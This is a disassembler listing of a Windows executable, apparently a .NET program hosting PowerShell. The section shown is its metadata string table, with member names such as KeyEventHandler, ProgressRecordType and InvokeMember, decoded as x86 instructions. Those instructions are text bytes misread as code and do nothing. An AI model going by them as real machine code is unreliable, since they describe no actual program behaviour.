  4081e2:	4d                   	dec    %ebp
  4081e3:	6f                   	outsl  %ds:(%esi),(%dx)
  4081e4:	76 65                	jbe    0x40824b
  4081e6:	4e                   	dec    %esi
  4081e7:	65 78 74             	gs js  0x40825e
  4081ea:	00 49 44             	add    %cl,0x44(%ecx)
  4081ed:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  4081f4:	6c                   	insb   (%dx),%es:(%edi)
  4081f5:	65 00 44 69 73       	add    %al,%gs:0x73(%ecx,%ebp,2)
  4081fa:	70 6f                	jo     0x40826b
  4081fc:	73 65                	jae    0x408263
  4081fe:	00 73 65             	add    %dh,0x65(%ebx)
  408201:	74 5f                	je     0x408262
  408203:	53                   	push   %ebx
  408204:	68 6f 77 41 6c       	push   $0x6c41776f
  408209:	77 61                	ja     0x40826c
  40820b:	79 73                	jns    0x408280
  40820d:	00 67 65             	add    %ah,0x65(%edi)
  408210:	74 5f                	je     0x408271
  408212:	43                   	inc    %ebx
  408213:	68 65 63 6b 65       	push   $0x656b6365
  408218:	64 00 42 79          	add    %al,%fs:0x79(%edx)
  40821c:	74 65                	je     0x408283
  40821e:	00 4b 65             	add    %cl,0x65(%ebx)
  408221:	79 45                	jns    0x408268
  408223:	76 65                	jbe    0x40828a
  408225:	6e                   	outsb  %ds:(%esi),(%dx)
  408226:	74 48                	je     0x408270
  408228:	61                   	popa
  408229:	6e                   	outsb  %ds:(%esi),(%dx)
  40822a:	64 6c                	fs insb (%dx),%es:(%edi)
  40822c:	65 72 00             	gs jb  0x40822f
  40822f:	61                   	popa
  408230:	64 64 5f             	fs fs pop %edi
  408233:	4b                   	dec    %ebx
  408234:	65 79 44             	gs jns 0x40827b
  408237:	6f                   	outsl  %ds:(%esi),(%dx)
  408238:	77 6e                	ja     0x4082a8
  40823a:	00 61 64             	add    %ah,0x64(%ecx)
  40823d:	64 5f                	fs pop %edi
  40823f:	4b                   	dec    %ebx
  408240:	65 79 55             	gs jns 0x408298
  408243:	70 00                	jo     0x408245
  408245:	67 65 74 5f          	addr16 gs je 0x4082a8
  408249:	4b                   	dec    %ebx
  40824a:	65 79 56             	gs jns 0x4082a3
  40824d:	61                   	popa
  40824e:	6c                   	insb   (%dx),%es:(%edi)
  40824f:	75 65                	jne    0x4082b6
  408251:	00 73 65             	add    %dh,0x65(%ebx)
  408254:	74 5f                	je     0x4082b5
  408256:	56                   	push   %esi
  408257:	69 72 74 75 61 6c 4b 	imul   $0x4b6c6175,0x74(%edx),%esi
  40825e:	65 79 43             	gs jns 0x4082a4
  408261:	6f                   	outsl  %ds:(%esi),(%dx)
  408262:	64 65 00 67 65       	fs add %ah,%gs:0x65(%edi)
  408267:	74 5f                	je     0x4082c8
  408269:	4b                   	dec    %ebx
  40826a:	65 79 43             	gs jns 0x4082b0
  40826d:	6f                   	outsl  %ds:(%esi),(%dx)
  40826e:	64 65 00 67 65       	fs add %ah,%gs:0x65(%edi)
  408273:	74 5f                	je     0x4082d4
  408275:	53                   	push   %ebx
  408276:	68 69 66 74 00       	push   $0x746669
  40827b:	67 65 74 5f          	addr16 gs je 0x4082de
  40827f:	41                   	inc    %ecx
  408280:	6c                   	insb   (%dx),%es:(%edi)
  408281:	74 00                	je     0x408283
  408283:	67 65 74 5f          	addr16 gs je 0x4082e6
  408287:	43                   	inc    %ebx
  408288:	6f                   	outsl  %ds:(%esi),(%dx)
  408289:	6e                   	outsb  %ds:(%esi),(%dx)
  40828a:	74 72                	je     0x4082fe
  40828c:	6f                   	outsl  %ds:(%esi),(%dx)
  40828d:	6c                   	insb   (%dx),%es:(%edi)
  40828e:	00 67 65             	add    %ah,0x65(%edi)
  408291:	74 5f                	je     0x4082f2
  408293:	43                   	inc    %ebx
  408294:	68 61 72 73 00       	push   $0x737261
  408299:	73 65                	jae    0x408300
  40829b:	74 5f                	je     0x4082fc
  40829d:	43                   	inc    %ebx
  40829e:	68 61 72 61 63       	push   $0x63617261
  4082a3:	74 65                	je     0x40830a
  4082a5:	72 00                	jb     0x4082a7
  4082a7:	73 65                	jae    0x40830e
  4082a9:	74 5f                	je     0x40830a
  4082ab:	4b                   	dec    %ebx
  4082ac:	65 79 44             	gs jns 0x4082f3
  4082af:	6f                   	outsl  %ds:(%esi),(%dx)
  4082b0:	77 6e                	ja     0x408320
  4082b2:	00 43 6f             	add    %al,0x6f(%ebx)
  4082b5:	6e                   	outsb  %ds:(%esi),(%dx)
  4082b6:	74 72                	je     0x40832a
  4082b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4082b9:	6c                   	insb   (%dx),%es:(%edi)
  4082ba:	4b                   	dec    %ebx
  4082bb:	65 79 53             	gs jns 0x408311
  4082be:	74 61                	je     0x408321
  4082c0:	74 65                	je     0x408327
  4082c2:	73 00                	jae    0x4082c4
  4082c4:	73 65                	jae    0x40832b
  4082c6:	74 5f                	je     0x408327
  4082c8:	43                   	inc    %ebx
  4082c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4082ca:	6e                   	outsb  %ds:(%esi),(%dx)
  4082cb:	74 72                	je     0x40833f
  4082cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4082ce:	6c                   	insb   (%dx),%es:(%edi)
  4082cf:	4b                   	dec    %ebx
  4082d0:	65 79 53             	gs jns 0x408326
  4082d3:	74 61                	je     0x408336
  4082d5:	74 65                	je     0x40833c
  4082d7:	00 67 65             	add    %ah,0x65(%edi)
  4082da:	74 5f                	je     0x40833b
  4082dc:	43                   	inc    %ebx
  4082dd:	6f                   	outsl  %ds:(%esi),(%dx)
  4082de:	6e                   	outsb  %ds:(%esi),(%dx)
  4082df:	74 72                	je     0x408353
  4082e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4082e2:	6c                   	insb   (%dx),%es:(%edi)
  4082e3:	4b                   	dec    %ebx
  4082e4:	65 79 53             	gs jns 0x40833a
  4082e7:	74 61                	je     0x40834a
  4082e9:	74 65                	je     0x408350
  4082eb:	00 67 65             	add    %ah,0x65(%edi)
  4082ee:	74 5f                	je     0x40834f
  4082f0:	4d                   	dec    %ebp
  4082f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4082f2:	64 69 66 69 65 72 73 	imul   $0x737265,%fs:0x69(%esi),%esp
  4082f9:	00 
  4082fa:	67 65 74 5f          	addr16 gs je 0x40835d
  4082fe:	42                   	inc    %edx
  4082ff:	6c                   	insb   (%dx),%es:(%edi)
  408300:	61                   	popa
  408301:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408304:	67 65 74 5f          	addr16 gs je 0x408367
  408308:	42                   	inc    %edx
  408309:	6c                   	insb   (%dx),%es:(%edi)
  40830a:	75 65                	jne    0x408371
  40830c:	00 67 65             	add    %ah,0x65(%edi)
  40830f:	74 5f                	je     0x408370
  408311:	43                   	inc    %ebx
  408312:	79 61                	jns    0x408375
  408314:	6e                   	outsb  %ds:(%esi),(%dx)
  408315:	00 43 6f             	add    %al,0x6f(%ebx)
  408318:	6c                   	insb   (%dx),%es:(%edi)
  408319:	6f                   	outsl  %ds:(%esi),(%dx)
  40831a:	72 54                	jb     0x408370
  40831c:	72 61                	jb     0x40837f
  40831e:	6e                   	outsb  %ds:(%esi),(%dx)
  40831f:	73 6c                	jae    0x40838d
  408321:	61                   	popa
  408322:	74 6f                	je     0x408393
  408324:	72 00                	jb     0x408326
  408326:	46                   	inc    %esi
  408327:	72 6f                	jb     0x408398
  408329:	6d                   	insl   (%dx),%es:(%edi)
  40832a:	48                   	dec    %eax
  40832b:	74 6d                	je     0x40839a
  40832d:	6c                   	insb   (%dx),%es:(%edi)
  40832e:	00 67 65             	add    %ah,0x65(%edi)
  408331:	74 5f                	je     0x408392
  408333:	4d                   	dec    %ebp
  408334:	61                   	popa
  408335:	67 65 6e             	outsb  %gs:(%si),(%dx)
  408338:	74 61                	je     0x40839b
  40833a:	00 67 65             	add    %ah,0x65(%edi)
  40833d:	74 5f                	je     0x40839e
  40833f:	52                   	push   %edx
  408340:	65 64 00 67 65       	gs add %ah,%fs:0x65(%edi)
  408345:	74 5f                	je     0x4083a6
  408347:	57                   	push   %edi
  408348:	68 69 74 65 00       	push   $0x657469
  40834d:	67 65 74 5f          	addr16 gs je 0x4083b0
  408351:	59                   	pop    %ecx
  408352:	65 6c                	gs insb (%dx),%es:(%edi)
  408354:	6c                   	insb   (%dx),%es:(%edi)
  408355:	6f                   	outsl  %ds:(%esi),(%dx)
  408356:	77 00                	ja     0x408358
  408358:	53                   	push   %ebx
  408359:	75 73                	jne    0x4083ce
  40835b:	70 65                	jo     0x4083c2
  40835d:	6e                   	outsb  %ds:(%esi),(%dx)
  40835e:	64 4c                	fs dec %esp
  408360:	61                   	popa
  408361:	79 6f                	jns    0x4083d2
  408363:	75 74                	jne    0x4083d9
  408365:	00 53 63             	add    %dl,0x63(%ebx)
  408368:	72 6f                	jb     0x4083d9
  40836a:	6c                   	insb   (%dx),%es:(%edi)
  40836b:	6c                   	insb   (%dx),%es:(%edi)
  40836c:	61                   	popa
  40836d:	62 6c 65 43          	bound  %ebp,0x43(%ebp,%eiz,2)
  408371:	6f                   	outsl  %ds:(%esi),(%dx)
  408372:	6e                   	outsb  %ds:(%esi),(%dx)
  408373:	74 72                	je     0x4083e7
  408375:	6f                   	outsl  %ds:(%esi),(%dx)
  408376:	6c                   	insb   (%dx),%es:(%edi)
  408377:	00 73 65             	add    %dh,0x65(%ebx)
  40837a:	74 5f                	je     0x4083db
  40837c:	41                   	inc    %ecx
  40837d:	75 74                	jne    0x4083f3
  40837f:	6f                   	outsl  %ds:(%esi),(%dx)
  408380:	53                   	push   %ebx
  408381:	63 72 6f             	arpl   %esi,0x6f(%edx)
  408384:	6c                   	insb   (%dx),%es:(%edi)
  408385:	6c                   	insb   (%dx),%es:(%edi)
  408386:	00 73 65             	add    %dh,0x65(%ebx)
  408389:	74 5f                	je     0x4083ea
  40838b:	42                   	inc    %edx
  40838c:	61                   	popa
  40838d:	63 6b 43             	arpl   %ebp,0x43(%ebx)
  408390:	6f                   	outsl  %ds:(%esi),(%dx)
  408391:	6c                   	insb   (%dx),%es:(%edi)
  408392:	6f                   	outsl  %ds:(%esi),(%dx)
  408393:	72 00                	jb     0x408395
  408395:	73 65                	jae    0x4083fc
  408397:	74 5f                	je     0x4083f8
  408399:	43                   	inc    %ebx
  40839a:	6f                   	outsl  %ds:(%esi),(%dx)
  40839b:	6e                   	outsb  %ds:(%esi),(%dx)
  40839c:	74 72                	je     0x408410
  40839e:	6f                   	outsl  %ds:(%esi),(%dx)
  40839f:	6c                   	insb   (%dx),%es:(%edi)
  4083a0:	42                   	inc    %edx
  4083a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4083a2:	78 00                	js     0x4083a4
  4083a4:	52                   	push   %edx
  4083a5:	65 73 75             	gs jae 0x40841d
  4083a8:	6d                   	insl   (%dx),%es:(%edi)
  4083a9:	65 4c                	gs dec %esp
  4083ab:	61                   	popa
  4083ac:	79 6f                	jns    0x40841d
  4083ae:	75 74                	jne    0x408424
  4083b0:	00 45 6c             	add    %al,0x6c(%ebp)
  4083b3:	61                   	popa
  4083b4:	70 73                	jo     0x408429
  4083b6:	65 64 45             	gs fs inc %ebp
  4083b9:	76 65                	jbe    0x408420
  4083bb:	6e                   	outsb  %ds:(%esi),(%dx)
  4083bc:	74 48                	je     0x408406
  4083be:	61                   	popa
  4083bf:	6e                   	outsb  %ds:(%esi),(%dx)
  4083c0:	64 6c                	fs insb (%dx),%es:(%edi)
  4083c2:	65 72 00             	gs jb  0x4083c5
  4083c5:	61                   	popa
  4083c6:	64 64 5f             	fs fs pop %edi
  4083c9:	45                   	inc    %ebp
  4083ca:	6c                   	insb   (%dx),%es:(%edi)
  4083cb:	61                   	popa
  4083cc:	70 73                	jo     0x408441
  4083ce:	65 64 00 73 65       	gs add %dh,%fs:0x65(%ebx)
  4083d3:	74 5f                	je     0x408434
  4083d5:	49                   	dec    %ecx
  4083d6:	6e                   	outsb  %ds:(%esi),(%dx)
  4083d7:	74 65                	je     0x40843e
  4083d9:	72 76                	jb     0x408451
  4083db:	61                   	popa
  4083dc:	6c                   	insb   (%dx),%es:(%edi)
  4083dd:	00 73 65             	add    %dh,0x65(%ebx)
  4083e0:	74 5f                	je     0x408441
  4083e2:	41                   	inc    %ecx
  4083e3:	75 74                	jne    0x408459
  4083e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4083e6:	52                   	push   %edx
  4083e7:	65 73 65             	gs jae 0x40844f
  4083ea:	74 00                	je     0x4083ec
  4083ec:	53                   	push   %ebx
  4083ed:	74 61                	je     0x408450
  4083ef:	72 74                	jb     0x408465
  4083f1:	00 67 65             	add    %ah,0x65(%edi)
  4083f4:	74 5f                	je     0x408455
  4083f6:	49                   	dec    %ecx
  4083f7:	74 65                	je     0x40845e
  4083f9:	6d                   	insl   (%dx),%es:(%edi)
  4083fa:	00 73 65             	add    %dh,0x65(%ebx)
  4083fd:	74 5f                	je     0x40845e
  4083ff:	56                   	push   %esi
  408400:	61                   	popa
  408401:	6c                   	insb   (%dx),%es:(%edi)
  408402:	75 65                	jne    0x408469
  408404:	00 52 65             	add    %dl,0x65(%edx)
  408407:	66 72 65             	data16 jb 0x40846f
  40840a:	73 68                	jae    0x408474
  40840c:	00 73 65             	add    %dh,0x65(%ebx)
  40840f:	74 5f                	je     0x408470
  408411:	4c                   	dec    %esp
  408412:	65 66 74 00          	gs data16 je 0x408416
  408416:	73 65                	jae    0x40847d
  408418:	74 5f                	je     0x408479
  40841a:	54                   	push   %esp
  40841b:	6f                   	outsl  %ds:(%esi),(%dx)
  40841c:	70 00                	jo     0x40841e
  40841e:	46                   	inc    %esi
  40841f:	6f                   	outsl  %ds:(%esi),(%dx)
  408420:	6e                   	outsb  %ds:(%esi),(%dx)
  408421:	74 00                	je     0x408423
  408423:	67 65 74 5f          	addr16 gs je 0x408486
  408427:	46                   	inc    %esi
  408428:	6f                   	outsl  %ds:(%esi),(%dx)
  408429:	6e                   	outsb  %ds:(%esi),(%dx)
  40842a:	74 00                	je     0x40842c
  40842c:	46                   	inc    %esi
  40842d:	6f                   	outsl  %ds:(%esi),(%dx)
  40842e:	6e                   	outsb  %ds:(%esi),(%dx)
  40842f:	74 53                	je     0x408484
  408431:	74 79                	je     0x4084ac
  408433:	6c                   	insb   (%dx),%es:(%edi)
  408434:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  408438:	74 5f                	je     0x408499
  40843a:	46                   	inc    %esi
  40843b:	6f                   	outsl  %ds:(%esi),(%dx)
  40843c:	6e                   	outsb  %ds:(%esi),(%dx)
  40843d:	74 00                	je     0x40843f
  40843f:	50                   	push   %eax
  408440:	72 6f                	jb     0x4084b1
  408442:	67 72 65             	addr16 jb 0x4084aa
  408445:	73 73                	jae    0x4084ba
  408447:	42                   	inc    %edx
  408448:	61                   	popa
  408449:	72 53                	jb     0x40849e
  40844b:	74 79                	je     0x4084c6
  40844d:	6c                   	insb   (%dx),%es:(%edi)
  40844e:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  408452:	74 5f                	je     0x4084b3
  408454:	53                   	push   %ebx
  408455:	74 79                	je     0x4084d0
  408457:	6c                   	insb   (%dx),%es:(%edi)
  408458:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  40845c:	74 5f                	je     0x4084bd
  40845e:	46                   	inc    %esi
  40845f:	6f                   	outsl  %ds:(%esi),(%dx)
  408460:	72 65                	jb     0x4084c7
  408462:	43                   	inc    %ebx
  408463:	6f                   	outsl  %ds:(%esi),(%dx)
  408464:	6c                   	insb   (%dx),%es:(%edi)
  408465:	6f                   	outsl  %ds:(%esi),(%dx)
  408466:	72 00                	jb     0x408468
  408468:	73 65                	jae    0x4084cf
  40846a:	74 5f                	je     0x4084cb
  40846c:	53                   	push   %ebx
  40846d:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408474:	5f                   	pop    %edi
  408475:	41                   	inc    %ecx
  408476:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  40847a:	69 74 79 49 64 00 50 	imul   $0x72500064,0x49(%ecx,%edi,2),%esi
  408481:	72 
  408482:	6f                   	outsl  %ds:(%esi),(%dx)
  408483:	67 72 65             	addr16 jb 0x4084eb
  408486:	73 73                	jae    0x4084fb
  408488:	52                   	push   %edx
  408489:	65 63 6f 72          	arpl   %ebp,%gs:0x72(%edi)
  40848d:	64 54                	fs push %esp
  40848f:	79 70                	jns    0x408501
  408491:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408495:	74 5f                	je     0x4084f6
  408497:	52                   	push   %edx
  408498:	65 63 6f 72          	arpl   %ebp,%gs:0x72(%edi)
  40849c:	64 54                	fs push %esp
  40849e:	79 70                	jns    0x408510
  4084a0:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  4084a4:	6d                   	insl   (%dx),%es:(%edi)
  4084a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4084a6:	76 65                	jbe    0x40850d
  4084a8:	00 53 79             	add    %dl,0x79(%ebx)
  4084ab:	73 74                	jae    0x408521
  4084ad:	65 6d                	gs insl (%dx),%es:(%edi)
  4084af:	2e 43                	cs inc %ebx
  4084b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4084b2:	6d                   	insl   (%dx),%es:(%edi)
  4084b3:	70 6f                	jo     0x408524
  4084b5:	6e                   	outsb  %ds:(%esi),(%dx)
  4084b6:	65 6e                	outsb  %gs:(%esi),(%dx)
  4084b8:	74 4d                	je     0x408507
  4084ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4084bb:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  4084be:	00 43 6f             	add    %al,0x6f(%ebx)
  4084c1:	6d                   	insl   (%dx),%es:(%edi)
  4084c2:	70 6f                	jo     0x408533
  4084c4:	6e                   	outsb  %ds:(%esi),(%dx)
  4084c5:	65 6e                	outsb  %gs:(%esi),(%dx)
  4084c7:	74 00                	je     0x4084c9
  4084c9:	52                   	push   %edx
  4084ca:	65 6d                	gs insl (%dx),%es:(%edi)
  4084cc:	6f                   	outsl  %ds:(%esi),(%dx)
  4084cd:	76 65                	jbe    0x408534
  4084cf:	41                   	inc    %ecx
  4084d0:	74 00                	je     0x4084d2
  4084d2:	53                   	push   %ebx
  4084d3:	74 6f                	je     0x408544
  4084d5:	70 00                	jo     0x4084d7
  4084d7:	67 65 74 5f          	addr16 gs je 0x40853a
  4084db:	50                   	push   %eax
  4084dc:	61                   	popa
  4084dd:	72 65                	jb     0x408544
  4084df:	6e                   	outsb  %ds:(%esi),(%dx)
  4084e0:	74 41                	je     0x408523
  4084e2:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  4084e6:	69 74 79 49 64 00 49 	imul   $0x6e490064,0x49(%ecx,%edi,2),%esi
  4084ed:	6e 
  4084ee:	73 65                	jae    0x408555
  4084f0:	72 74                	jb     0x408566
  4084f2:	00 67 65             	add    %ah,0x65(%edi)
  4084f5:	74 5f                	je     0x408556
  4084f7:	41                   	inc    %ecx
  4084f8:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  4084fc:	69 74 79 00 67 65 74 	imul   $0x5f746567,0x0(%ecx,%edi,2),%esi
  408503:	5f 
  408504:	53                   	push   %ebx
  408505:	74 61                	je     0x408568
  408507:	74 75                	je     0x40857e
  408509:	73 44                	jae    0x40854f
  40850b:	65 73 63             	gs jae 0x408571
  40850e:	72 69                	jb     0x408579
  408510:	70 74                	jo     0x408586
  408512:	69 6f 6e 00 67 65 74 	imul   $0x74656700,0x6e(%edi),%ebp
  408519:	5f                   	pop    %edi
  40851a:	50                   	push   %eax
  40851b:	65 72 63             	gs jb  0x408581
  40851e:	65 6e                	outsb  %gs:(%esi),(%dx)
  408520:	74 43                	je     0x408565
  408522:	6f                   	outsl  %ds:(%esi),(%dx)
  408523:	6d                   	insl   (%dx),%es:(%edi)
  408524:	70 6c                	jo     0x408592
  408526:	65 74 65             	gs je  0x40858e
  408529:	00 67 65             	add    %ah,0x65(%edi)
  40852c:	74 5f                	je     0x40858d
  40852e:	53                   	push   %ebx
  40852f:	65 63 6f 6e          	arpl   %ebp,%gs:0x6e(%edi)
  408533:	64 73 52             	fs jae 0x408588
  408536:	65 6d                	gs insl (%dx),%es:(%edi)
  408538:	61                   	popa
  408539:	69 6e 69 6e 67 00 54 	imul   $0x5400676e,0x69(%esi),%ebp
  408540:	69 6d 65 53 70 61 6e 	imul   $0x6e617053,0x65(%ebp),%ebp
  408547:	00 67 65             	add    %ah,0x65(%edi)
  40854a:	74 5f                	je     0x4085ab
  40854c:	54                   	push   %esp
  40854d:	6f                   	outsl  %ds:(%esi),(%dx)
  40854e:	74 61                	je     0x4085b1
  408550:	6c                   	insb   (%dx),%es:(%edi)
  408551:	48                   	dec    %eax
  408552:	6f                   	outsl  %ds:(%esi),(%dx)
  408553:	75 72                	jne    0x4085c7
  408555:	73 00                	jae    0x408557
  408557:	49                   	dec    %ecx
  408558:	6e                   	outsb  %ds:(%esi),(%dx)
  408559:	74 33                	je     0x40858e
  40855b:	32 00                	xor    (%eax),%al
  40855d:	67 65 74 5f          	addr16 gs je 0x4085c0
  408561:	4d                   	dec    %ebp
  408562:	69 6e 75 74 65 73 00 	imul   $0x736574,0x75(%esi),%ebp
  408569:	67 65 74 5f          	addr16 gs je 0x4085cc
  40856d:	53                   	push   %ebx
  40856e:	65 63 6f 6e          	arpl   %ebp,%gs:0x6e(%edi)
  408572:	64 73 00             	fs jae 0x408575
  408575:	46                   	inc    %esi
  408576:	6f                   	outsl  %ds:(%esi),(%dx)
  408577:	72 6d                	jb     0x4085e6
  408579:	61                   	popa
  40857a:	74 00                	je     0x40857c
  40857c:	43                   	inc    %ebx
  40857d:	6f                   	outsl  %ds:(%esi),(%dx)
  40857e:	6e                   	outsb  %ds:(%esi),(%dx)
  40857f:	63 61 74             	arpl   %esp,0x74(%ecx)
  408582:	00 67 65             	add    %ah,0x65(%edi)
  408585:	74 5f                	je     0x4085e6
  408587:	43                   	inc    %ebx
  408588:	75 72                	jne    0x4085fc
  40858a:	72 65                	jb     0x4085f1
  40858c:	6e                   	outsb  %ds:(%esi),(%dx)
  40858d:	74 4f                	je     0x4085de
  40858f:	70 65                	jo     0x4085f6
  408591:	72 61                	jb     0x4085f4
  408593:	74 69                	je     0x4085fe
  408595:	6f                   	outsl  %ds:(%esi),(%dx)
  408596:	6e                   	outsb  %ds:(%esi),(%dx)
  408597:	00 41 70             	add    %al,0x70(%ecx)
  40859a:	70 6c                	jo     0x408608
  40859c:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  4085a3:	00 44 6f 45          	add    %al,0x45(%edi,%ebp,2)
  4085a7:	76 65                	jbe    0x40860e
  4085a9:	6e                   	outsb  %ds:(%esi),(%dx)
  4085aa:	74 73                	je     0x40861f
  4085ac:	00 4d 65             	add    %cl,0x65(%ebp)
  4085af:	73 73                	jae    0x408624
  4085b1:	61                   	popa
  4085b2:	67 65 42             	addr16 gs inc %edx
  4085b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4085b6:	78 00                	js     0x4085b8
  4085b8:	67 65 74 5f          	addr16 gs je 0x40861b
  4085bc:	50                   	push   %eax
  4085bd:	61                   	popa
  4085be:	72 61                	jb     0x408621
  4085c0:	6d                   	insl   (%dx),%es:(%edi)
  4085c1:	65 74 65             	gs je  0x408629
  4085c4:	72 41                	jb     0x408607
  4085c6:	73 73                	jae    0x40863b
  4085c8:	65 6d                	gs insl (%dx),%es:(%edi)
  4085ca:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  4085ce:	75 6c                	jne    0x40863c
  4085d0:	6c                   	insb   (%dx),%es:(%edi)
  4085d1:	4e                   	dec    %esi
  4085d2:	61                   	popa
  4085d3:	6d                   	insl   (%dx),%es:(%edi)
  4085d4:	65 00 54 79 70       	add    %dl,%gs:0x70(%ecx,%edi,2)
  4085d9:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  4085dd:	6e                   	outsb  %ds:(%esi),(%dx)
  4085de:	74 69                	je     0x408649
  4085e0:	6d                   	insl   (%dx),%es:(%edi)
  4085e1:	65 54                	gs push %esp
  4085e3:	79 70                	jns    0x408655
  4085e5:	65 48                	gs dec %eax
  4085e7:	61                   	popa
  4085e8:	6e                   	outsb  %ds:(%esi),(%dx)
  4085e9:	64 6c                	fs insb (%dx),%es:(%edi)
  4085eb:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  4085ef:	74 54                	je     0x408645
  4085f1:	79 70                	jns    0x408663
  4085f3:	65 46                	gs inc %esi
  4085f5:	72 6f                	jb     0x408666
  4085f7:	6d                   	insl   (%dx),%es:(%edi)
  4085f8:	48                   	dec    %eax
  4085f9:	61                   	popa
  4085fa:	6e                   	outsb  %ds:(%esi),(%dx)
  4085fb:	64 6c                	fs insb (%dx),%es:(%edi)
  4085fd:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  408601:	74 54                	je     0x408657
  408603:	79 70                	jns    0x408675
  408605:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408609:	74 5f                	je     0x40866a
  40860b:	49                   	dec    %ecx
  40860c:	73 41                	jae    0x40864f
  40860e:	72 72                	jb     0x408682
  408610:	61                   	popa
  408611:	79 00                	jns    0x408613
  408613:	47                   	inc    %edi
  408614:	65 74 45             	gs je  0x40865c
  408617:	6c                   	insb   (%dx),%es:(%edi)
  408618:	65 6d                	gs insl (%dx),%es:(%edi)
  40861a:	65 6e                	outsb  %gs:(%esi),(%dx)
  40861c:	74 54                	je     0x408672
  40861e:	79 70                	jns    0x408690
  408620:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  408624:	61                   	popa
  408625:	72 00                	jb     0x408627
  408627:	4d                   	dec    %ebp
  408628:	61                   	popa
  408629:	6b 65 47 65          	imul   $0x65,0x47(%ebp),%esp
  40862d:	6e                   	outsb  %ds:(%esi),(%dx)
  40862e:	65 72 69             	gs jb  0x40869a
  408631:	63 54 79 70          	arpl   %edx,0x70(%ecx,%edi,2)
  408635:	65 00 45 6d          	add    %al,%gs:0x6d(%ebp)
  408639:	70 74                	jo     0x4086af
  40863b:	79 54                	jns    0x408691
  40863d:	79 70                	jns    0x4086af
  40863f:	65 73 00             	gs jae 0x408642
  408642:	43                   	inc    %ebx
  408643:	6f                   	outsl  %ds:(%esi),(%dx)
  408644:	6e                   	outsb  %ds:(%esi),(%dx)
  408645:	73 74                	jae    0x4086bb
  408647:	72 75                	jb     0x4086be
  408649:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  40864d:	49                   	dec    %ecx
  40864e:	6e                   	outsb  %ds:(%esi),(%dx)
  40864f:	66 6f                	outsw  %ds:(%esi),(%dx)
  408651:	00 42 69             	add    %al,0x69(%edx)
  408654:	6e                   	outsb  %ds:(%esi),(%dx)
  408655:	64 69 6e 67 46 6c 61 	imul   $0x67616c46,%fs:0x67(%esi),%ebp
  40865c:	67 
  40865d:	73 00                	jae    0x40865f
  40865f:	42                   	inc    %edx
  408660:	69 6e 64 65 72 00 50 	imul   $0x50007265,0x64(%esi),%ebp
  408667:	61                   	popa
  408668:	72 61                	jb     0x4086cb
  40866a:	6d                   	insl   (%dx),%es:(%edi)
  40866b:	65 74 65             	gs je  0x4086d3
  40866e:	72 4d                	jb     0x4086bd
  408670:	6f                   	outsl  %ds:(%esi),(%dx)
  408671:	64 69 66 69 65 72 00 	imul   $0x47007265,%fs:0x69(%esi),%esp
  408678:	47 
  408679:	65 74 43             	gs je  0x4086bf
  40867c:	6f                   	outsl  %ds:(%esi),(%dx)
  40867d:	6e                   	outsb  %ds:(%esi),(%dx)
  40867e:	73 74                	jae    0x4086f4
  408680:	72 75                	jb     0x4086f7
  408682:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  408686:	00 49 6e             	add    %cl,0x6e(%ecx)
  408689:	76 6f                	jbe    0x4086fa
  40868b:	6b 65 00 43          	imul   $0x43,0x0(%ebp),%esp
  40868f:	6f                   	outsl  %ds:(%esi),(%dx)
  408690:	6e                   	outsb  %ds:(%esi),(%dx)
  408691:	76 65                	jbe    0x4086f8
  408693:	72 74                	jb     0x408709
  408695:	00 43 68             	add    %al,0x68(%ebx)
  408698:	61                   	popa
  408699:	6e                   	outsb  %ds:(%esi),(%dx)
  40869a:	67 65 54             	addr16 gs push %esp
  40869d:	79 70                	jns    0x40870f
  40869f:	65 00 49 6e          	add    %cl,%gs:0x6e(%ecx)
  4086a3:	76 6f                	jbe    0x408714
  4086a5:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  4086a9:	6d                   	insl   (%dx),%es:(%edi)
  4086aa:	62 65 72             	bound  %esp,0x72(%ebp)
  4086ad:	00 41 72             	add    %al,0x72(%ecx)
  4086b0:	72 61                	jb     0x408713
  4086b2:	79 00                	jns    0x4086b4
  4086b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4086b5:	70 5f                	jo     0x408716
  4086b7:	49                   	dec    %ecx
  4086b8:	6e                   	outsb  %ds:(%esi),(%dx)
  4086b9:	65 71 75             	gs jno 0x408731
  4086bc:	61                   	popa
  4086bd:	6c                   	insb   (%dx),%es:(%edi)
  4086be:	69 74 79 00 6f 70 5f 	imul   $0x455f706f,0x0(%ecx,%edi,2),%esi
  4086c5:	45 
  4086c6:	71 75                	jno    0x40873d
  4086c8:	61                   	popa
  4086c9:	6c                   	insb   (%dx),%es:(%edi)
  4086ca:	69 74 79 00 67 65 74 	imul   $0x5f746567,0x0(%ecx,%edi,2),%esi
  4086d1:	5f 
  4086d2:	44                   	inc    %esp
  4086d3:	65 66 61             	gs popaw
